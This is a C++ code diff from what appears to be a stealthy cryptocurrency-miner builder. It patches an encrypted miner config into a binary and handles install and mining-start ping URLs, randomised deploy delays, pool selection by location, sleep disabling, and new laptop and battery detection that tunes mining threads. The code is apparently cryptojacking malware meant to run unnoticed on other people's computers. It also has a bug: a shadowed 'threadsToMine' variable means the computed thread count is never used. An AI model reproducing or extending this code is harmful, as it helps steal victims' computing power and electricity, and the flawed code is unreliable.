@@ -68,13 +68,13 @@ void configLightDecrypt(minerConfig* mConfigp, int magick54)
 
 void replaceMinerConfig(minerConfig* mConfigp, char** bin, size_t size) 
 {
-    uint64_t pNum = mConfigp->pointer;
+    char* pointer = mConfigp->pointer;
 
-    for (size_t i = 0; i < size - sizeof(uint64_t); i++) {
-        uint64_t* p = (uint64_t*)(*bin + i);
+    for (size_t i = 0; i < size - sizeof(mConfigp); i++) {
 
-        if (*p == pNum) {
-            minerConfig* pToChange = (minerConfig*)p;
+        if(memcmp(*bin + i, mConfigp, sizeof(mConfigp->pointer)) == 0)
+        {
+            minerConfig* pToChange = (minerConfig*)(*bin + i);
             *pToChange = *mConfigp;
             i += sizeof(minerConfig) - 1;
         }
@@ -93,6 +93,37 @@ int randomAnInt(int min, int max, int exception)
     } while (randomed == exception && (min != max));
 
     return randomed;
+}
+
+bool isLaptop() 
+{
+    SYSTEM_POWER_STATUS sps;
+    GetSystemPowerStatus(&sps);
+
+    // Check for battery presence
+    bool hasBattery = (sps.BatteryFlag != 128);
+    bool lidSwitchPresent = false;
+
+    SYSTEM_POWER_CAPABILITIES spc;
+    if (GetPwrCapabilities(&spc)) {
+        lidSwitchPresent = spc.LidPresent;
+    }
+
+    if (hasBattery || lidSwitchPresent) 
+    {
+        return true;
+    }
+
+    return false;
+}
+
+bool isRunningOnBattery() 
+{
+    SYSTEM_POWER_STATUS sps;
+    if (GetSystemPowerStatus(&sps)) {
+        return sps.ACLineStatus == 0;
+    }
+    return false; // Default to false if unable to retrieve status
 }
 
 uint32_t determineThreadsToMine(uint8_t maxCPUUsage, uint32_t L3CachePerThread)
@@ -134,6 +165,7 @@ uint32_t determineThreadsToMine(uint8_t maxCPUUsage, uint32_t L3CachePerThread)
 
     //Determine number of threads for mining depending on max CPU %
     //Or how much L3 cache system has but do not exceed max CPU %
+    //Or if system is desktop or a laptop
 
     maxThreadsToMine = std::floor(maxCPUUsage / 100.0f * numCPU);
 
@@ -270,7 +302,8 @@ void settingsFromConfig(minerConfig* mConfig, settings* s1)
     s1->installPingUrl = std::string(mConfig->installPingUrl);
     s1->miningStartPingUrl = std::string(mConfig->miningStartPingUrl);
 
-    s1->maxThreads = mConfig->maxThreads;
+    s1->maxThreadsDesktop = mConfig->maxThreadsDesktop;
+    s1->maxThreadsLaptop = mConfig->maxThreadsLaptop;
     s1->L3CachePerThread = mConfig->L3CachePerThread;
     s1->lightModeRam = mConfig->lightModeRam;
 
@@ -279,6 +312,10 @@ void settingsFromConfig(minerConfig* mConfig, settings* s1)
 
     s1->minerDeployDelayMin = mConfig->minerDeployDelayMin;
     s1->minerDeployDelayMax = mConfig->minerDeployDelayMax;
+
+    s1->heavyCalcDelay = mConfig->heavyCalcDelay;
+    s1->onBatteryMining = mConfig->onBatteryMining;
+    s1->disableSleep = mConfig->disableSleep;
 }
 
 void generateSettings(minerConfig* mConfig, settings* s1)
@@ -349,7 +386,8 @@ void generateSettings(minerConfig* mConfig, settings* s1)
     strcpy_s(mConfig->installPingUrl, s1->installPingUrl.size() + 1, s1->installPingUrl.c_str());
     strcpy_s(mConfig->miningStartPingUrl, s1->miningStartPingUrl.size() + 1, s1->miningStartPingUrl.c_str());
 
-    mConfig->maxThreads = s1->maxThreads;
+    mConfig->maxThreadsDesktop = s1->maxThreadsDesktop;
+    mConfig->maxThreadsLaptop = s1->maxThreadsLaptop;
 
     mConfig->L3CachePerThread = s1->L3CachePerThread;
     mConfig->lightModeRam = s1->lightModeRam;
@@ -359,6 +397,10 @@ void generateSettings(minerConfig* mConfig, settings* s1)
 
     mConfig->minerDeployDelayMin = s1->minerDeployDelayMin;
     mConfig->minerDeployDelayMax = s1->minerDeployDelayMax;
+
+    mConfig->heavyCalcDelay = s1->heavyCalcDelay;
+    mConfig->onBatteryMining = s1->onBatteryMining;
+   mConfig->disableSleep = s1->disableSleep;
 
     mConfig->configured = true;
 }
@@ -380,7 +422,15 @@ std::string constructArguments(minerConfig* mConfigp)
     }
     else
     {
-        uint32_t threadsToMine = determineThreadsToMine(mConfigp->maxThreads, mConfigp->L3CachePerThread);
+        uint32_t threadsToMine = 0;
+        if (isLaptop()) 
+        {
+            uint32_t threadsToMine = determineThreadsToMine(mConfigp->maxThreadsLaptop, mConfigp->L3CachePerThread);
+        }
+        else 
+        {
+            uint32_t threadsToMine = determineThreadsToMine(mConfigp->maxThreadsDesktop, mConfigp->L3CachePerThread);
+        }
         selectPoolByLocation(mConfigp, &primaryPool, &backupPool);
         //First pool
         args += "-o ";
